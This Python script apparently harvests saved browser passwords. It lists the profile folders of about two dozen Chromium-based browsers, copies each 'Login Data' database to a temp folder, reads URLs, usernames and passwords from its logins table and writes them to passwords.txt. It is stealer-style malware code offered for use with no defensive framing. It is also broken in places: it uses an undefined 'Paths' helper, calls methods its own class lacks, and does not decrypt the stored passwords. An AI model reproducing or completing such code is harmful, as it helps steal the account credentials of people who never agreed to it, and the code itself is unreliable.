import os
import shutil
AppData = os.path.join(os.environ['APPDATA'], "")
LOCAL = os.path.join(os.environ['LOCALAPPDATA'], "")

Browser = [
    os.path.join(AppData, "Opera Software\\Opera Stable"),
    os.path.join(LOCAL, "Google\\Chrome"),
    os.path.join(LOCAL, "Google(x86)\\Chrome"),
    os.path.join(LOCAL, "Chromium"),
    os.path.join(LOCAL, "BraveSoftware\\Brave-Browser"),
    os.path.join(LOCAL, "Epic Privacy Browser"),
    os.path.join(LOCAL, "Amigo"),
    os.path.join(LOCAL, "Vivaldi"),
    os.path.join(LOCAL, "Orbitum"),
    os.path.join(LOCAL, "Mail.Ru\\Atom"),
    os.path.join(LOCAL, "Kometa"),
    os.path.join(LOCAL, "Comodo\\Dragon"),
    os.path.join(LOCAL, "Torch"),
    os.path.join(LOCAL, "Comodo"),
    os.path.join(LOCAL, "Slimjet"),
    os.path.join(LOCAL, "360Browser\\Browser"),
    os.path.join(LOCAL, "Maxthon3"),
    os.path.join(LOCAL, "K-Melon"),
    os.path.join(LOCAL, "Sputnik\\Sputnik"),
    os.path.join(LOCAL, "Nichrome"),
    os.path.join(LOCAL, "CocCoc\\Browser"),
    os.path.join(LOCAL, "uCozMedia\\Uran"),
    os.path.join(LOCAL, "Chromodo"),
    os.path.join(LOCAL, "Yandex\\YandexBrowser")
]

class SQL:
    def save(filename):
        counter = 0

        with open(filename, 'w') as sw:
            for browser in Browser:
                BrowserPath = os.path.join(Paths.get_user_data(browser), "Login Data")
                if os.path.exists(BrowserPath):
                    temp = os.path.join(os.environ['TEMP'], "browserPasswords")
                    if os.path.exists(temp):
                        os.remove(temp)
                    shutil.copy(BrowserPath, temp)

                    sSQLite = SQL(temp)
                    sSQLite.read_table("logins")

                    for i in range(sSQLite.get_row_count()):
                        hostname = sSQLite.get_value(i, 0)
                        username = sSQLite.get_value(i, 3)
                        password = sSQLite.get_value(i, 5)

                        if not password:
                            break

                        try:
                            sw.write(f"URL: {hostname} | Username: {username} | Password: {password}\n")
                            counter += 1
                        except:
                            pass

        print(f"Found {counter} passwords data and saved in {filename}")

print(SQL.save("passwords.txt"))